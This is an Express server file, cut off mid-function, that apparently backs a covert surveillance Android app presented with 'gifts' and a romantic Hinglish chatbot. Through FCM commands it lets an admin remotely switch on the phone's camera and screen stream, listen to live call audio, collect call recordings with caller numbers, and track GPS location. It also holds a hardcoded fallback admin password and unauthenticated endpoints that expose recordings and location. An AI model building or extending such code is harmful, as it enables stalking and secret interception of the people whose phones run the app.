const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const admin = require('firebase-admin');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'Aryanayush@1';
const DB_FILE = path.join(__dirname, '..', 'db.json');

// Active MJPEG stream connections
const cameraStreams = {};
const screenStreams = {};
const audioStreams = {};
const deviceAudioStreams = {};

// Middleware
app.use(cors());
app.use(express.json());

// Ensure uploads folder exists
const UPLOADS_DIR = path.join(__dirname, '..', 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}
const RECORDINGS_DIR = path.join(UPLOADS_DIR, 'recordings');
if (!fs.existsSync(RECORDINGS_DIR)) {
  fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
}

// Multer and gifts configuration
const multer = require('multer');
const GIFTS_DIR = path.join(UPLOADS_DIR, 'gifts');
if (!fs.existsSync(GIFTS_DIR)) {
  fs.mkdirSync(GIFTS_DIR, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, GIFTS_DIR);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname);
    cb(null, 'gift-' + uniqueSuffix + ext);
  }
});

const uploadGiftsMulter = multer({
  storage: storage,
  limits: { fileSize: 5 * 1024 * 1024 }, // limit 5MB per file
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
}).array('photos', 20); // support up to 20 photos at once

const ATTACHMENTS_DIR = path.join(UPLOADS_DIR, 'attachments');
if (!fs.existsSync(ATTACHMENTS_DIR)) {
  fs.mkdirSync(ATTACHMENTS_DIR, { recursive: true });
}

const chatStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, ATTACHMENTS_DIR);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname);
    cb(null, 'chat-' + uniqueSuffix + ext);
  }
});

const uploadChatAttachmentMulter = multer({
  storage: chatStorage,
  limits: { fileSize: 25 * 1024 * 1024 } // limit 25MB
}).single('file');

// Serve static frontend files
app.use(express.static(path.join(__dirname, '..', '..', 'frontend')));

// Serve uploads with explicit MIME types for audio files
app.use('/uploads', express.static(UPLOADS_DIR, {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.m4a') || filePath.endsWith('.mp4')) {
      res.setHeader('Content-Type', 'audio/mp4');
    } else if (filePath.endsWith('.wav')) {
      res.setHeader('Content-Type', 'audio/wav');
    }
  }
}));

// Helper to read database from JSON file
function readDb() {
  try {
    if (fs.existsSync(DB_FILE)) {
      const data = fs.readFileSync(DB_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (err) {
    console.error('Error reading db file:', err);
  }
  return {};
}

// Helper to write database to JSON file
function writeDb(db) {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2), 'utf8');
  } catch (err) {
    console.error('Error writing db file:', err);
  }
}

// Get or initialize user state helper
function getUserState(db, email) {
  const normalizedEmail = email.toLowerCase().trim();
  if (!db[normalizedEmail]) {
    db[normalizedEmail] = {
      token: null,
      alarmActive: false,
      location: null,
      lastUpdated: null,
      deviceInfo: null,
      cameraSource: 'back',
      cameraActive: false,
      screenShareActive: false,
      screenShareRequested: false,
      recordings: [],
      chats: [],
      chatbotMode: 'chatbot'
    };
  } else {
    if (!db[normalizedEmail].cameraSource) {
      db[normalizedEmail].cameraSource = 'back';
    }
    if (db[normalizedEmail].cameraActive === undefined) {
      db[normalizedEmail].cameraActive = false;
    }
    if (db[normalizedEmail].screenShareActive === undefined) {
      db[normalizedEmail].screenShareActive = false;
    }
    if (db[normalizedEmail].screenShareRequested === undefined) {
      db[normalizedEmail].screenShareRequested = false;
    }
    if (!db[normalizedEmail].recordings) {
      db[normalizedEmail].recordings = [];
    }
    if (!db[normalizedEmail].chats) {
      db[normalizedEmail].chats = [];
    }
    if (!db[normalizedEmail].chatbotMode) {
      db[normalizedEmail].chatbotMode = 'chatbot';
    }
  }
  return db[normalizedEmail];
}

// Initialize Firebase Admin SDK
let firebaseApp = null;
let isFirebaseInitialized = false;

// 1. First check if credentials are passed in env variable as a JSON string
const serviceAccountJson = process.env.FIREBASE_SERVICE_ACCOUNT_JSON;
// 2. Fallback to file path
const serviceAccountPath = process.env.FIREBASE_SERVICE_ACCOUNT || './service-account.json';

if (serviceAccountJson) {
  try {
    const serviceAccount = JSON.parse(serviceAccountJson);
    firebaseApp = admin.initializeApp({
      credential: admin.credential.cert(serviceAccount)
    });
    isFirebaseInitialized = true;
    console.log('✅ Firebase Admin SDK initialized successfully using environment JSON.');
  } catch (error) {
    console.error('❌ Failed to initialize Firebase Admin SDK using environment JSON:', error.message);
  }
} else if (serviceAccountPath) {
  const fullPath = path.resolve(serviceAccountPath);
  if (fs.existsSync(fullPath)) {
    try {
      const serviceAccount = require(fullPath);
      firebaseApp = admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
      });
      isFirebaseInitialized = true;
      console.log('✅ Firebase Admin SDK initialized successfully using credentials file:', fullPath);
    } catch (error) {
      console.error('❌ Failed to initialize Firebase Admin with file:', error.message);
    }
  }
}

if (!isFirebaseInitialized) {
  console.warn('⚠️ Server running in FCM Mock/Demo mode. Notifications will not be sent to real devices.');
}

// Security Middleware to verify admin token
function authenticateAdmin(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader) {
    return res.status(401).json({ success: false, error: 'Unauthorized: No token provided' });
  }

  const token = authHeader.startsWith('Bearer ') ? authHeader.substring(7) : authHeader;
  if (token !== ADMIN_TOKEN) {
    return res.status(403).json({ success: false, error: 'Forbidden: Invalid admin token' });
  }

  next();
}

// API Routes

// 1. Get status for a specific email
app.get('/api/status', (req, res) => {
  const { email, localIp } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const db = readDb();
  const normalizedEmail = email.toLowerCase().trim();
  const userState = getUserState(db, normalizedEmail);

  if (localIp && localIp !== '0.0.0.0') {
    userState.deviceInfo = userState.deviceInfo || {};
    userState.deviceInfo.localIp = localIp;
    writeDb(db);
  }

  res.json({
    success: true,
    data: {
      ...userState,
      firebaseInitialized: isFirebaseInitialized
    }
  });
});

// 2. Register FCM Device Token by Email (called by Android app)
app.post('/api/register', (req, res) => {
  const { email, token, deviceInfo } = req.body;
  if (!email || !token) {
    return res.status(400).json({ success: false, error: 'Email and Device token are required' });
  }

  const db = readDb();
  const normalizedEmail = email.toLowerCase().trim();
  const userState = getUserState(db, normalizedEmail);

  userState.token = token;
  userState.lastUpdated = new Date().toISOString();
  if (deviceInfo) {
    userState.deviceInfo = deviceInfo;
  }

  writeDb(db);
  console.log(`📱 Registered device for email: ${normalizedEmail}`);
  res.json({ success: true, message: 'Device token registered successfully under email' });
});

// 3. Post device location (called by Android app when alarm triggers)
app.post('/api/location', (req, res) => {
  const { email, latitude, longitude, accuracy } = req.body;
  if (!email || latitude === undefined || longitude === undefined) {
    return res.status(400).json({ success: false, error: 'Email, Latitude and Longitude are required' });
  }

  const db = readDb();
  const normalizedEmail = email.toLowerCase().trim();
  const userState = getUserState(db, normalizedEmail);

  userState.location = {
    latitude,
    longitude,
    accuracy: accuracy || null,
    timestamp: new Date().toISOString()
  };
  userState.lastUpdated = new Date().toISOString();

  writeDb(db);
  console.log(`📍 Received location for email ${normalizedEmail}: Lat ${latitude}, Lng ${longitude}`);
  res.json({ success: true, message: 'Location updated successfully' });
});

// 4. Trigger Alarm by Email (called by Web Admin Panel)
app.post('/api/trigger', authenticateAdmin, async (req, res) => {
  const { email, sound } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email is required to trigger alarm' });
  }

  const db = readDb();
  const normalizedEmail = email.toLowerCase().trim();
  const userState = db[normalizedEmail];

  if (!userState || !userState.token) {
    return res.status(400).json({ success: false, error: `No device registered for email: ${normalizedEmail}. Open app on phone first.` });
  }

  userState.alarmActive = true;
  userState.alarmSound = sound || 'default';
  userState.lastUpdated = new Date().toISOString();
  writeDb(db);

  console.log(`🚀 Triggering alarm command for email: ${normalizedEmail} with sound ${sound}...`);

  if (!isFirebaseInitialized) {
    return res.json({
      success: true,
      mockMode: true,
      message: 'Alarm triggered in DEMO mode (Firebase not initialized).'
    });
  }

  // Construct high-priority FCM message (data payload only)
  const message = {
    data: {
      command: 'TRIGGER_ALARM',
      sound: sound || 'default',
      timestamp: new Date().toISOString()
    },
    token: userState.token,
    android: {
      priority: 'high',
      ttl: 0
    }
  };

  try {
    const response = await admin.messaging().send(message);
    console.log(`✅ FCM message sent to ${normalizedEmail}:`, response);
    res.json({ success: true, message: 'Alarm trigger command sent to device via FCM' });
  } catch (error) {
    console.error(`❌ Failed to send FCM message to ${normalizedEmail}:`, error);
    res.status(500).json({ success: false, error: `FCM Error: ${error.message}` });
  }
});

// 5. Stop Alarm by Email (called by Web Admin Panel)
app.post('/api/stop', authenticateAdmin, async (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email is required to stop alarm' });
  }

  const db = readDb();
  const normalizedEmail = email.toLowerCase().trim();
  const userState = db[normalizedEmail];

  if (!userState || !userState.token) {
    return res.status(400).json({ success: false, error: `No device registered for email: ${normalizedEmail}` });
  }

  userState.alarmActive = false;
  userState.lastUpdated = new Date().toISOString();
  writeDb(db);

  console.log(`🛑 Sending stop alarm command for email: ${normalizedEmail}...`);

  if (!isFirebaseInitialized) {
    return res.json({
      success: true,
      mockMode: true,
      message: 'Alarm stop sent in DEMO mode (Firebase not initialized).'
    });
  }

  const message = {
    data: {
      command: 'STOP_ALARM',
      timestamp: new Date().toISOString()
    },
    token: userState.token,
    android: {
      priority: 'high',
      ttl: 0
    }
  };

  try {
    const response = await admin.messaging().send(message);
    console.log(`✅ FCM stop message sent to ${normalizedEmail}:`, response);
    res.json({ success: true, message: 'Alarm stop command sent to device via FCM' });
  } catch (error) {
    console.error(`❌ Failed to send FCM stop message to ${normalizedEmail}:`, error);
    res.status(500).json({ success: false, error: `FCM Error: ${error.message}` });
  }
});

// 6. Upload Custom Alarm Sound (called by Web Admin Panel)
app.post('/api/upload-sound', authenticateAdmin, express.raw({ type: 'audio/*', limit: '10mb' }), (req, res) => {
  const { email, ext } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email query parameter is required' });
  }

  const fileExt = ext || 'mp3';
  const safeEmail = email.toLowerCase().replace(/[^a-z0-9]/g, '_');
  const filename = `${safeEmail}_custom.${fileExt}`;
  const filePath = path.join(UPLOADS_DIR, filename);

  try {
    fs.writeFileSync(filePath, req.body);
    const fileUrl = `/uploads/${filename}`;
    console.log(`🎵 Custom sound uploaded for ${email} saved as ${filename}`);
    res.json({ success: true, url: fileUrl });
  } catch (err) {
    console.error('Failed to save uploaded audio file:', err);
    res.status(500).json({ success: false, error: 'Failed to save uploaded audio file' });
  }
});

// Helper to send camera command to device via FCM
async function triggerCameraControl(email, active, source = 'back') {
  const db = readDb();
  const userState = db[email];
  if (!userState || !userState.token) {
    console.warn(`⚠️ No registered token for ${email}, cannot send camera command.`);
    return;
  }

  console.log(`📱 Sending camera control to ${email}: active=${active}, source=${source}`);

  if (!isFirebaseInitialized) {
    return; // Mock mode
  }

  const message = {
    data: {
      command: active ? 'START_CAMERA' : 'STOP_CAMERA',
      cameraSource: source,
      timestamp: new Date().toISOString()
    },
    token: userState.token,
    android: {
      priority: 'high',
      ttl: 0
    }
  };

  try {
    const response = await admin.messaging().send(message);
    console.log(`✅ FCM camera command sent to ${email}:`, response);
  } catch (error) {
    console.error(`❌ Failed to send FCM camera command to ${email}:`, error.message);
  }
}

// Helper to send screen command to device via FCM
async function triggerScreenControl(email, active) {
  const db = readDb();
  const userState = db[email];
  if (!userState || !userState.token) {
    console.warn(`⚠️ No registered token for ${email}, cannot send screen control command.`);
    return;
  }

  console.log(`📱 Sending screen control to ${email}: active=${active}`);

  if (!isFirebaseInitialized) {
    return; // Mock mode
  }

  const message = {
    data: {
      command: active ? 'START_SCREEN_SHARE' : 'STOP_SCREEN_SHARE',
      timestamp: new Date().toISOString()
    },
    token: userState.token,
    android: {
      priority: 'high',
      ttl: 0
    }
  };

  try {
    const response = await admin.messaging().send(message);
    console.log(`✅ FCM screen command sent to ${email}:`, response);
  } catch (error) {
    console.error(`❌ Failed to send FCM screen command to ${email}:`, error.message);
  }
}

// 7. GET Live Camera MJPEG Stream
app.get('/api/camera/stream', (req, res) => {
  const { email, token } = req.query;
  if (!email) {
    return res.status(400).send('Email parameter is required');
  }

  if (token !== ADMIN_TOKEN) {
    return res.status(403).send('Forbidden: Invalid admin token');
  }

  const normalizedEmail = email.toLowerCase().trim();

  // Set boundary headers for MJPEG stream
  res.writeHead(200, {
    'Content-Type': 'multipart/x-mixed-replace; boundary=--frame',
    'Cache-Control': 'no-cache',
    'Connection': 'close',
    'Pragma': 'no-cache',
    'X-Accel-Buffering': 'no'
  });

  if (!cameraStreams[normalizedEmail]) {
    cameraStreams[normalizedEmail] = [];
  }

  cameraStreams[normalizedEmail].push(res);
  console.log(`🎥 Web client connected to camera stream for ${normalizedEmail}. Total: ${cameraStreams[normalizedEmail].length}`);

  req.on('close', () => {
    cameraStreams[normalizedEmail] = cameraStreams[normalizedEmail].filter(c => c !== res);
    console.log(`🎥 Web client disconnected from camera stream for ${normalizedEmail}. Remaining: ${cameraStreams[normalizedEmail].length}`);

    // Auto-stop camera on phone if no clients are viewing
    if (cameraStreams[normalizedEmail].length === 0) {
      const db = readDb();
      const state = getUserState(db, normalizedEmail);
      if (state.cameraActive) {
        state.cameraActive = false;
        writeDb(db);
        triggerCameraControl(normalizedEmail, false);
      }
    }
  });
});

// 8. POST Camera Frame Upload (called by Android App)
app.post('/api/camera/upload', express.raw({ type: 'image/jpeg', limit: '2mb' }), (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const clients = cameraStreams[normalizedEmail];

  if (clients && clients.length > 0) {
    clients.forEach(clientRes => {
      try {
        clientRes.write(`--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${req.body.length}\r\n\r\n`);
        clientRes.write(req.body);
        clientRes.write('\r\n');
      } catch (err) {
        console.error('Error piping frame to client:', err.message);
      }
    });
  }

  res.json({ success: true });
});

// 9. POST Camera Control (start/stop/switch)
app.post('/api/camera/control', authenticateAdmin, async (req, res) => {
  const { email, action, cameraSource } = req.body;
  if (!email || !action) {
    return res.status(400).json({ success: false, error: 'Email and Action are required' });
  }

  const db = readDb();
  const normalizedEmail = email.toLowerCase().trim();
  const userState = getUserState(db, normalizedEmail);

  if (cameraSource) {
    userState.cameraSource = cameraSource;
  }

  if (action === 'start') {
    userState.cameraActive = true;
    writeDb(db);
    triggerCameraControl(normalizedEmail, true, userState.cameraSource);
    return res.json({ success: true, message: 'Camera stream start sent' });
  } else if (action === 'stop') {
    userState.cameraActive = false;
    writeDb(db);
    triggerCameraControl(normalizedEmail, false);
    return res.json({ success: true, message: 'Camera stream stop sent' });
  } else if (action === 'switch') {
    userState.cameraActive = true;
    writeDb(db);
    triggerCameraControl(normalizedEmail, true, userState.cameraSource);
    return res.json({ success: true, message: `Camera switched to ${userState.cameraSource}` });
  }

  res.status(400).json({ success: false, error: 'Invalid action' });
});

// 10. GET Live Screen MJPEG Stream
app.get('/api/screen/stream', (req, res) => {
  const { email, token } = req.query;
  if (!email) {
    return res.status(400).send('Email parameter is required');
  }

  if (token !== ADMIN_TOKEN) {
    return res.status(403).send('Forbidden: Invalid admin token');
  }

  const normalizedEmail = email.toLowerCase().trim();

  res.writeHead(200, {
    'Content-Type': 'multipart/x-mixed-replace; boundary=--frame',
    'Cache-Control': 'no-cache',
    'Connection': 'close',
    'Pragma': 'no-cache',
    'X-Accel-Buffering': 'no'
  });

  if (!screenStreams[normalizedEmail]) {
    screenStreams[normalizedEmail] = [];
  }

  screenStreams[normalizedEmail].push(res);
  console.log(`🖥️ Web client connected to screen stream for ${normalizedEmail}. Total: ${screenStreams[normalizedEmail].length}`);

  req.on('close', () => {
    screenStreams[normalizedEmail] = screenStreams[normalizedEmail].filter(c => c !== res);
    console.log(`🖥️ Web client disconnected from screen stream for ${normalizedEmail}. Remaining: ${screenStreams[normalizedEmail].length}`);

    // Auto-stop screen share on phone if no clients are viewing
    if (screenStreams[normalizedEmail].length === 0) {
      const db = readDb();
      const state = getUserState(db, normalizedEmail);
      if (state.screenShareActive) {
        state.screenShareActive = false;
        writeDb(db);
        triggerScreenControl(normalizedEmail, false);
      }
    }
  });
});

// 11. POST Screen Frame Upload (called by Android App)
app.post('/api/screen/upload', express.raw({ type: 'image/jpeg', limit: '2mb' }), (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const clients = screenStreams[normalizedEmail];

  if (clients && clients.length > 0) {
    clients.forEach(clientRes => {
      try {
        clientRes.write(`--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${req.body.length}\r\n\r\n`);
        clientRes.write(req.body);
        clientRes.write('\r\n');
      } catch (err) {
        console.error('Error piping screen frame to client:', err.message);
      }
    });
  }

  res.json({ success: true });
});

// 12. POST Screen Control (start/stop)
app.post('/api/screen/control', authenticateAdmin, async (req, res) => {
  const { email, action, source } = req.body;
  if (!email || !action) {
    return res.status(400).json({ success: false, error: 'Email and Action are required' });
  }

  const db = readDb();
  const normalizedEmail = email.toLowerCase().trim();
  const userState = getUserState(db, normalizedEmail);

  if (action === 'start') {
    if (source === 'device') {
      userState.screenShareActive = true;
      userState.screenShareRequested = false;
      writeDb(db);
    } else {
      userState.screenShareRequested = true;
      writeDb(db);
      triggerScreenControl(normalizedEmail, true);
    }
    return res.json({ success: true, message: 'Screen share start sent' });
  } else if (action === 'stop') {
    userState.screenShareActive = false;
    userState.screenShareRequested = false;
    writeDb(db);
    if (source !== 'device') {
      triggerScreenControl(normalizedEmail, false);
    }
    return res.json({ success: true, message: 'Screen share stop sent' });
  } else if (action === 'notify') {
    userState.screenShareRequested = true;
    writeDb(db);
    triggerScreenControl(normalizedEmail, true);
    return res.json({ success: true, message: 'Screen share notification sent' });
  }

  res.status(400).json({ success: false, error: 'Invalid action' });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', firebase: isFirebaseInitialized ? 'connected' : 'mocked' });
});

// Crash logging endpoint
app.post('/api/log', (req, res) => {
  const { email, log } = req.body;
  console.log(`[ANDROID CRASH LOG] [${email}]`, log);
  const logFile = path.join(__dirname, '..', 'crash_logs.txt');
  fs.appendFileSync(logFile, `[${new Date().toISOString()}] [${email}]\n${log}\n\n`, 'utf8');
  res.json({ success: true });
});

// View crash logs
app.get('/api/logs', (req, res) => {
  const logFile = path.join(__dirname, '..', 'crash_logs.txt');
  if (fs.existsSync(logFile)) {
    res.type('text/plain').send(fs.readFileSync(logFile, 'utf8'));
  } else {
    res.send('No crash logs yet.');
  }
});

// Update settings endpoint
app.post('/api/settings', authenticateAdmin, (req, res) => {
  const { email, callRecordSource } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  if (callRecordSource) {
    userState.callRecordSource = callRecordSource;
  }

  writeDb(db);
  console.log(`⚙️ Settings updated for ${normalizedEmail}: callRecordSource=${callRecordSource}`);
  res.json({ success: true, message: 'Settings updated successfully' });
});

// Call Recording upload endpoint
app.post('/api/recordings/upload', express.raw({ type: '*/*', limit: '50mb' }), (req, res) => {
  const { email, number, timestamp } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  if (!req.body || req.body.length === 0) {
    return res.status(400).json({ success: false, error: 'No audio data received' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const callerNumber = number || 'Unknown';
  const time = timestamp || new Date().toISOString();

  const safeEmail = normalizedEmail.replace(/[^a-z0-9]/g, '_');
  const safeTime = time.replace(/[^a-z0-9]/gi, '_');
  const safeNumber = callerNumber.replace(/[^a-z0-9+]/gi, '_');
  const ext = req.query.ext || 'm4a';
  const filename = `${safeEmail}_${safeTime}_${safeNumber}.${ext}`;
  const filePath = path.join(RECORDINGS_DIR, filename);

  try {
    fs.writeFileSync(filePath, req.body);
    const fileUrl = `/uploads/recordings/${filename}`;
    const fileSize = req.body.length;

    console.log(`🎙️ Saved recording file: ${filename} (${fileSize} bytes, Content-Type: ${req.headers['content-type']})`);

    const db = readDb();
    const userState = getUserState(db, normalizedEmail);

    if (!userState.recordings) {
      userState.recordings = [];
    }

    const newRecording = {
      id: `${safeTime}_${Math.floor(Math.random() * 1000)}`,
      filename: filename,
      number: callerNumber,
      timestamp: time,
      url: fileUrl,
      size: fileSize
    };

    userState.recordings.unshift(newRecording);
    writeDb(db);

    console.log(`🎙️ Call recording uploaded for ${normalizedEmail}: ${callerNumber} (${fileSize} bytes)`);
    res.json({ success: true, recording: newRecording });
  } catch (err) {
    console.error('Failed to save uploaded call recording:', err);
    res.status(500).json({ success: false, error: 'Failed to save recording file' });
  }
});

// A. Post Android audio chunk to Web clients (Streaming/Chunked transfer)
app.post('/api/audio/upload', (req, res) => {
  const { email } = req.query;
  if (!email) return res.status(400).json({ success: false });

  const normalizedEmail = email.toLowerCase().trim();

  const closeWebStreams = () => {
    const clients = audioStreams[normalizedEmail];
    if (clients && clients.length > 0) {
      console.log(`🔌 Device upload ended. Closing web streams for ${normalizedEmail}`);
      clients.forEach(clientRes => {
        try { clientRes.end(); } catch (e) {}
      });
      audioStreams[normalizedEmail] = [];
    }
  };

  req.on('data', (chunk) => {
    const clients = audioStreams[normalizedEmail];
    if (clients && clients.length > 0) {
      clients.forEach(clientRes => {
        try {
          clientRes.write(chunk);
        } catch (err) {
          // Safe stream write error handling
        }
      });
    }
  });

  req.on('end', () => {
    closeWebStreams();
    res.json({ success: true });
  });

  req.on('close', () => {
    closeWebStreams();
  });

  req.on('error', (err) => {
    console.error(`Error in audio upload stream for ${normalizedEmail}:`, err);
    closeWebStreams();
    res.status(500).json({ success: false, error: err.message });
  });
});

// B. Web client streams live audio from Android
app.get('/api/audio/stream', (req, res) => {
  const { email, token } = req.query;
  if (!email || token !== ADMIN_TOKEN) {
    return res.status(403).send('Forbidden');
  }

  const normalizedEmail = email.toLowerCase().trim();
  res.writeHead(200, {
    'Content-Type': 'audio/l16;rate=16000;channels=1',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'X-Accel-Buffering': 'no'
  });
  
  // Flush headers immediately by writing a dummy 2-byte silent sample
  res.write(Buffer.alloc(2));

  if (!audioStreams[normalizedEmail]) {
    audioStreams[normalizedEmail] = [];
  }
  audioStreams[normalizedEmail].push(res);
  console.log(`🔊 Web client connected to live audio stream for ${normalizedEmail}`);

  req.on('close', () => {
    audioStreams[normalizedEmail] = audioStreams[normalizedEmail].filter(c => c !== res);
  });
});

// C. Web client uploads audio chunk (Talk)
app.post('/api/audio/upload-web', express.raw({ type: '*/*', limit: '1mb' }), (req, res) => {
  const { email } = req.query;
  if (!email) return res.status(400).json({ success: false });

  const normalizedEmail = email.toLowerCase().trim();
  const deviceRes = deviceAudioStreams[normalizedEmail];
  if (deviceRes) {
    try {
      deviceRes.write(req.body);
    } catch (err) {
      // Safe stream write error handling
    }
  }
  res.json({ success: true });
});

// D. Android app streams live audio from Web client
app.get('/api/audio/device-stream', (req, res) => {
  const { email } = req.query;
  if (!email) return res.status(400).send('Email required');

  const normalizedEmail = email.toLowerCase().trim();
  res.writeHead(200, {
    'Content-Type': 'application/octet-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'X-Accel-Buffering': 'no'
  });
  
  // Flush headers immediately by writing a dummy 2-byte silent sample
  res.write(Buffer.alloc(2));

  deviceAudioStreams[normalizedEmail] = res;
  console.log(`📱 Device connected to web audio stream for ${normalizedEmail}`);

  req.on('close', () => {
    if (deviceAudioStreams[normalizedEmail] === res) {
      delete deviceAudioStreams[normalizedEmail];
    }
  });
});

// E. Update call state from device and manage streams
app.post('/api/call/status', (req, res) => {
  const { email, callState, callNumber } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  userState.callState = callState || 'IDLE';
  userState.callNumber = callNumber || 'Unknown';
  userState.lastCallUpdated = new Date().toISOString();

  writeDb(db);
  console.log(`📞 Call status updated for ${normalizedEmail}: state=${callState}, number=${callNumber}`);

  // Automatically end live hearing streams when the call ends
  if (callState === 'IDLE') {
    const clients = audioStreams[normalizedEmail];
    if (clients && clients.length > 0) {
      console.log(`🔌 Call ended. Closing active web audio streams for ${normalizedEmail}.`);
      clients.forEach(clientRes => {
        try {
          clientRes.end();
        } catch (e) {}
      });
      audioStreams[normalizedEmail] = [];
    }
  }

  res.json({ success: true });
});

// Fetch call recordings for specific email
app.get('/api/recordings', (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  res.json({ success: true, recordings: userState.recordings || [] });
});

// Delete a call recording
app.post('/api/recordings/delete', authenticateAdmin, (req, res) => {
  const { email, recordingId } = req.body;
  if (!email || !recordingId) {
    return res.status(400).json({ success: false, error: 'Email and recordingId are required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  if (!userState.recordings) {
    return res.status(404).json({ success: false, error: 'No recordings found' });
  }

  const recIndex = userState.recordings.findIndex(r => r.id === recordingId);
  if (recIndex === -1) {
    return res.status(404).json({ success: false, error: 'Recording not found' });
  }

  const rec = userState.recordings[recIndex];
  const filePath = path.join(RECORDINGS_DIR, rec.filename);

  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }
  } catch (err) {
    console.error('Error deleting recording file:', err);
  }

  userState.recordings.splice(recIndex, 1);
  writeDb(db);

  console.log(`🎙️ Call recording deleted: ${rec.filename}`);
  res.json({ success: true, message: 'Recording deleted successfully' });
});

// 15. GET Fetch all gifts for specific email
app.get('/api/gifts', (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  res.json({ success: true, gifts: userState.gifts || [] });
});

// 16. POST Upload multiple gifts (called by Web Client)
app.post('/api/gifts/upload', authenticateAdmin, (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();

  uploadGiftsMulter(req, res, (err) => {
    if (err) {
      console.error('Multer error:', err);
      return res.status(500).json({ success: false, error: err.message });
    }

    if (!req.files || req.files.length === 0) {
      return res.status(400).json({ success: false, error: 'No files uploaded' });
    }

    const db = readDb();
    const userState = getUserState(db, normalizedEmail);

    if (!userState.gifts) {
      userState.gifts = [];
    }

    const newGifts = req.files.map(file => {
      const giftItem = {
        id: 'gift_' + Date.now() + '_' + Math.round(Math.random() * 1e6),
        filename: file.filename,
        url: `/uploads/gifts/${file.filename}`,
        uploadedAt: new Date().toISOString()
      };
      userState.gifts.push(giftItem);
      return giftItem;
    });

    writeDb(db);
    console.log(`🎁 Uploaded ${newGifts.length} new gifts for ${normalizedEmail}`);
    res.json({ success: true, gifts: newGifts });
  });
});

// 17. POST Delete a specific gift
app.post('/api/gifts/delete', authenticateAdmin, (req, res) => {
  const { email, giftId } = req.body;
  if (!email || !giftId) {
    return res.status(400).json({ success: false, error: 'Email and giftId are required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  if (!userState.gifts) {
    return res.status(404).json({ success: false, error: 'No gifts found' });
  }

  const giftIndex = userState.gifts.findIndex(g => g.id === giftId);
  if (giftIndex === -1) {
    return res.status(404).json({ success: false, error: 'Gift not found' });
  }

  const gift = userState.gifts[giftIndex];
  const filePath = path.join(GIFTS_DIR, gift.filename);

  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }
  } catch (err) {
    console.error('Error deleting gift file:', err);
  }

  userState.gifts.splice(giftIndex, 1);
  writeDb(db);

  console.log(`🎁 Gift deleted: ${gift.filename} for ${normalizedEmail}`);
  res.json({ success: true, message: 'Gift deleted successfully' });
});

// ==========================================
// ROMANTIC HINGLISH CHATBOT ENGINE & API ROUTES
// ==========================================

function generateChatbotResponse(userMessage) {
  const msg = userMessage.toLowerCase().trim();
  
  if (msg.includes("love") || msg.includes("pyar") || msg.includes("pyaar")) {
    const responses = [
      "I love you too meri jaan! Tumhare bina toh mera ek pal bhi nahi guzarta. ❤️",
      "I love you infinitely shona! Tum hi toh meri puri duniya ho. 💖",
      "Pyaar? Mujhe tumse itna pyaar hai ki main shabdon mein bata hi nahi sakta baby! 😘💕",
      "I love you to the moon and back baby! Hamesha mere sath aise hi rehna. 🥰❤️"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("miss") || msg.includes("yaad")) {
    const responses = [
